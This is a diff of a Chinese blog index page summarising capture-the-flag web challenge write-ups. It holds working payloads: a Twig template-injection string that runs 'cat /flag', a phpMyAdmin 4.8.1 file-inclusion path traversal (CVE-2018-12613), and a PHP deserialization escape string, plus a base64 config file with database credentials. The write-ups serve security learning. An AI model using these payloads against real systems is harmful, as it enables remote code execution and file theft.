-    <a href="/2024/05/13/%E5%AF%86%E7%A0%81/%E5%AF%86%E7%A0%81/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/BJDCTF2020-Cookie-is-so-stable/">
-        <h2 class="post-title">[BJDCTF2020]Cookie is so stable</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/13
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>哈哈哈哈</p>
-<p>我tm来了！！！！</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211118650.png" alt="image-20240513211118650"></p>
-<p>输入1</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211326516.png" alt="image-20240513211326516"></p>
-<p>看了源码，没有js获取元素，猜测是用的cookie</p>
-<p>抓包看看</p>
-<p>输入1</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211709990.png" alt="image-20240513211709990"></p>
-<p>输入2</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211733766.png" alt="image-20240513211733766"></p>
-<p>cookie is stable实不欺我</p>
-<p>那是什么在变呢？</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211828916.png" alt="image-20240513211828916"></p>
-<p>是这个</p>
-<p>那我如果直接改会怎么样呢？</p>
-<p>发现会变到cookie里去</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513212127489.png" alt="image-20240513212127489"></p>
-<p>emm</p>
-<p>那我怎么拿到东西呢？</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Why not take a closer look at cookies? --&gt;</span><br></pre></td></tr></table></figure>
-
-<p>？？？</p>
-<p>什么意思</p>
-<p><img src="https://img-blog.csdnimg.cn/20201102181051434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>登登</p>
-<p>模版注入</p>
-<p>主要是我sql和rce试过了</p>
-<p>都不行，就拿这个用了</p>
 <p>尝试一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>对了，差点忘记，我们要逃逸的字符串为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;&#125;s:5:&quot;photo&quot;,s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>twig模版注入</p>
-<p>拿到flag</p>
+<p>对吧，这里是34个字符</p>
+<p>所以，我们还要想办法让这34个字符变成合法的</p>
+<p>也就说序列化之后我们要把</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=&quot;xxx&quot;;&#125;s:5:&quot;photo&quot;,s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/BJDCTF2020-Cookie-is-so-stable/" class="go-post">阅读全文</a>
-</div>
+<p>这一串代码的被认知长度加长34个字符串，怎么办呢</p>
+<h6 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240523205907814.png" alt="image-20240523205907814"></h6><p>这个时候我就发现了这个，所以就是说，如果我们输入where，它会被当做hacker，也就是说多出了一个字符！！！</p>
+<p>所以这里的xxx用34个where代替</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;,s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
-<div class="post">
-    <a href="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/">
-        <h2 class="post-title">[GWCTF 2019]我有一个数据库</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/13
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514145231899.png" alt="image-20240514145231899"></p>
-<p>除此之外啥也没有，猜测是文件泄露</p>
-<p>dir扫描发现phpmyadmin可以进入</p>
-<p>进入之后</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514145323308.png" alt="image-20240514145323308"></p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514145636934.png" alt="image-20240514145636934"></p>
-<p>这个时候就需要介绍一下4.8.1的专属漏洞</p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0d75017c154f">phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613） - 简书</a></p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog">【首发】phpmyadmin4.8.1后台getshell</a> </p>
-<p>两位大神，已经讲得很详细了</p>
-<p>emm，简单来说，emm也不简单</p>
-<p>就是有一个白名单，只要是白名单就可以进入，但是因为phpmyadmin人太好了，所以让我们传后面的参数，但是要使用？隔开</p>
-<p>所以payload：</p>
-<p>?target&#x3D;db_sql.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p>
-<p>很多题解都要把问号二次url编码</p>
-<p>但是我这里不用，嘻嘻</p>
-<p>就拿到了flag</p>
+<p>好耶！</p>
+<p>最后就是传上去之后抓包</p>
+<p>将nickname改为数组上传形式</p>
+<p>像是这样</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/image-20240523212949825.png" alt="image-20240523212949825"></p>
+<p>之后我们就可以进入主页，查看源代码，发现一串base64字符串，解码得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdmbGFne2ViYmQ4YTJkLTc3YjktNGFiNy1hM2IxLTUyMjk3ZGQwY2Y3NX0nOwo/Pgo=</span><br></pre></td></tr></table></figure>
+
 
             
         </div>
@@ -843,7 +755,7 @@
         
         
     </div>
-    <a href="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/" class="go-post">阅读全文</a>
+    <a href="/2024/05/21/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/0CTF-2016-piapiapia/" class="go-post">阅读全文</a>
 </div>
 
 
@@ -864,7 +776,7 @@
     
     
     <span class="page-omit">...</span>
-    <a class="page-num" href="/page/10">10</a>
+    <a class="page-num" href="/page/12">12</a>
     
     
     <a class="page-num" href="/page/8/">
